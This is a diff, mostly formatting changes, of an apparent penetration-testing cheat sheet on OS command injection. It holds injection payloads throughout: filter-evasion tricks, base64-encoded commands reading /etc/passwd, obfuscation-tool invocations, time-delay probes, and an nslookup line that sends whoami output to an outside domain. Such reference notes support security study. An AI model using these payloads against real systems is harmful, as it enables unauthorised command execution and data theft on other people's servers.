@@ -2,10 +2,8 @@
 
 {% hint style="info" %}
 * The user input we control must directly or indirectly go into (or somehow affect) a web query that executes system commands. All web programming languages have different functions that enable the developer to execute operating system commands directly on the back-end server.
-* **PHP Functions :** `exec`, `system`, `shell_exec`, `passthru`, or `popen`&#x20;
+* **PHP Functions :** `exec`, `system`, `shell_exec`, `passthru`, or `popen`
 * **NodeJS Funtions :** `child_process.exec` or `child_process.spawn`
-
-
 {% endhint %}
 
 | Semicolon  | `;`    | `%3b`       | Both                                       |
@@ -18,7 +16,7 @@
 | Sub-Shell  | ` `` ` | `%60%60`    | Both **(Linux-only)**                      |
 | Sub-Shell  | `$()`  | `%24%28%29` | Both **(Linux-only)**                      |
 
-* **Command separators**:  (`&`, `|`, `&&`, `||`, `0x0a` or `\n` or `%0a`) -> works for both windows and UNIX
+* **Command separators**: (`&`, `|`, `&&`, `||`, `0x0a` or `\n` or `%0a`) -> works for both windows and UNIX
 * **Unix specific Separators** - `;`, `` `injected command` ``, `$(injected command)`
 * Might need to close the quotes(", ') for command to execute
 * eg: `& echo hello &`, `& ping -c 10 127.0.0.1` (blind)
@@ -27,7 +25,7 @@
 ### OS Command Injection <sub>(simple case)</sub>
 
 * Check whether any input parameters execute OS commands
-* eg:  `& echo helloworld &`&#x20;
+* eg: `& echo helloworld &`
 
 ### Bypass Filters
 
@@ -38,36 +36,35 @@
   * Fuzz for the accepted operator initial befere appending a command.
 * #### Bypass Blacklisted Spaces <a href="#bypass-blacklisted-spaces" id="bypass-blacklisted-spaces"></a>
   * Use Tabs - `%09`
-  * Using $IFS - `${IFS}`  <sup><sub>(default value is a space and a tab in Linux)<sub></sup>
-  * Using Brace Expansion - eg: `127.0.0.1%0a`**`{ls,-la}`**&#x20;
+  * Using $IFS - `${IFS}` <sup><sub>(default value is a space and a tab in Linux)<sub></sup>
+  * Using Brace Expansion - eg: `127.0.0.1%0a`**`{ls,-la}`**
   * [PayloadsAllTheThings-bypasswithoutspace](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
 * #### Bypassing slash (`/`) or backslash (`\`)
-  * **Linux** <sup><sub>(<sub></sup><sup><sub>`echo`<sub></sup> <sup><sub> </sup><sup><sub>not required)<sub></sup>
-    * Use env variables like `${IFS}`&#x20;
-    * `/` or `\`  characters may be used in an environment variable, and we can specify `start` and `length` of our string to exactly match this character.&#x20;
-    * eg: `echo ${PATH:0:1}` , `echo ${LS_COLORS:10:1}`. We can do the same with the `$HOME` or `$PWD` environment variables as well. &#x20;
-    * **Payload** :  `127.0.0.1${LS_COLORS:10:1}${IFS}`&#x20;
-  * **Windows** <sup><sub>(<sub></sup><sup><sub>`echo`<sub></sup> <sup><sub> </sup><sup><sub>not required)<sub></sup>
+  * **Linux** <sup><sub>(<sub></sup><sup><sub>`echo`<sub></sup> <sup><sub>not required)<sub></sup>
+    * Use env variables like `${IFS}`
+    * `/` or `\` characters may be used in an environment variable, and we can specify `start` and `length` of our string to exactly match this character.
+    * eg: `echo ${PATH:0:1}` , `echo ${LS_COLORS:10:1}`. We can do the same with the `$HOME` or `$PWD` environment variables as well.
+    * **Payload** : `127.0.0.1${LS_COLORS:10:1}${IFS}`
+  * **Windows** <sup><sub>(<sub></sup><sup><sub>`echo`<sub></sup> <sup><sub>not required)<sub></sup>
     * To produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\student`), and then specify a starting position (`~6` -> `\student`)
-    * eg: `echo`` `**`%HOMEPATH:~6,-11%`** , `$env:HOMEPATH[0]` , `$env:PROGRAMFILES[10]`&#x20;
-  * #### Character Shifting <sup><sub>(<sub></sup><sup><sub>`echo`<sub></sup> <sup><sub> </sup><sup><sub>not required)<sub></sup>
-    * `man ascii` <sup><sub>(\ is on 92, before it is \[ on 91)<sub></sup>
-      &#x20;-> `echo`` `**`$(tr '!-}' '"-~'<<<[)`**&#x20;
+    * eg: ` echo`` `` `**`%HOMEPATH:~6,-11%`** , `$env:HOMEPATH[0]` , `$env:PROGRAMFILES[10]`
+  * #### Character Shifting <sup><sub>(<sub></sup><sup><sub>`echo`<sub></sup> <sup><sub>not required)<sub></sup>
+    * `man ascii` <sup><sub>(\ is on 92, before it is \[ on 91)<sub></sup> -> ` echo`` `` `**`$(tr '!-}' '"-~'<<<[)`**
 
 ### Bypassing Blacklisted Commands <a href="#bypassing-blacklisted-commands" id="bypassing-blacklisted-commands"></a>
 
 * **Linux & Windows**
   * Inserting certain characters within our command that are usually ignored by command shells like `Bash` or `PowerShell` and will execute the same command.
-  * eg:  `'` ,  `"`&#x20;
-  * **Payload**: `w'h'o'am'i` , `w"h"o"am"i`&#x20;
+  * eg: `'` , `"`
+  * **Payload**: `w'h'o'am'i` , `w"h"o"am"i`
   * **Note**: We cannot mix types of quotes and the number of quotes must be even.
 * **Linux Only**
   * Insert Linux-only characters in the middle of commands, and the bash shell would ignore them and execute the command.
   * Characters include the backslash `\` and the positional parameter character `$@`
-  * **Payloads**: `who$@ami`, `w\ho\am\i`&#x20;
+  * **Payloads**: `who$@ami`, `w\ho\am\i`
 * **Windows Only**
   * Insert Windows-only characters in the middle of commands that do not affect the outcome, like a caret (`^`) character.
-  * **Payloads**: `who^ami`&#x20;
+  * **Payloads**: `who^ami`
 * #### **Case Manipulation**
   * Invert the character cases of a command (e.g. `WHOAMI`) or alternating between cases (e.g. `WhOaMi`)
   * Windows OS is case-insensitive, but Linux is case-senstive.
@@ -75,31 +72,31 @@
 * #### **Reversed Commands**
   * Reversing commands and having a command template that switches them back and executes them in real-time.
   * If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command.
-  * Linux - `$(rev<<<'imaohw')`&#x20;
-  * Windows - `iex "$('imaohw'[-1..-20] -join '')"`&#x20;
+  * Linux - `$(rev<<<'imaohw')`
+  * Windows - `iex "$('imaohw'[-1..-20] -join '')"`
 * #### **Encoded Commands**
   * We can utilize various encoding tools, like `base64` (for b64 encoding) or `xxd` (for hex encoding)
   * Encode the payload we want to execute (which includes filtered characters)
-    * `echo -n 'cat /etc/passwd | grep 33' | base64`&#x20;
+    * `echo -n 'cat /etc/passwd | grep 33' | base64`
     * `echo -n whoami | iconv -f utf-8 -t utf-16le | base64`
     * `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
-  * **Payload** :&#x20;
-    * `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`&#x20;
+  * **Payload** :
+    * `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
     * `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`
   * Use other alternatives like `sh` for command execution and `openssl` for b64 decoding, or `xxd` for hex decoding
   * [PayloadsAllTheThings-bypasswithvariableexpansion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)
 
 ### Evasion Tools
 
-* **Linux**&#x20;
-  * [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) - `./bashfuscator -c 'cat /etc/passwd'` , `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1`&#x20;
+* **Linux**
+  * [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) - `./bashfuscator -c 'cat /etc/passwd'` , `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1`
 * **Windows**
   * [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) - `Import-Module .\Invoke-DOSfuscation.psd1` -> `Invoke-DOSfuscation`
 
 ### Blind OS Command Injection with Time Delays
 
 * `& ping -c 10 127.0.0.1 &` (try using different separators) <sup><sub>(Linux)<sub></sup>
-* `& ping -n 10 127.0.0.1 &` <sup><sub>(Windows - uses `-n` instead of `-c`)<sub></sup>
+* `& ping -n 10 127.0.0.1 &` <sup><sub>(Windows - uses<sub></sup> <sup><sub> </sup><sup><sub>`-n`<sub></sup> <sup><sub> </sup><sup><sub>instead of<sub></sup> <sup><sub> </sup><sup><sub>`-c`<sub></sup><sup><sub>)<sub></sup>
 * `& timeout /t 10 &` <sup><sub>(Windows alternative - direct sleep, no ICMP needed)<sub></sup>
 * Triggers a time delay to send 10 ICMP packets
 
@@ -107,12 +104,12 @@
 
 * Output the contents of a command to a text file that can be viewed in the browser
 * Need to try in different folders that has write privilege
-* eg:  `& whoami > var/www/html/whoami.txt &`
+* eg: `& whoami > var/www/html/whoami.txt &`
 
 ### Blind OS Command Injection with Out-of-Band Interaction
 
 * Make use of burp collaborator to initiate a `nslookup`
-* eg: `& nslookup domain.com &`, `& nslookup whoami.domain.com &`&#x20;
+* eg: `& nslookup domain.com &`, `& nslookup whoami.domain.com &`
 
 ### Mitigations
 
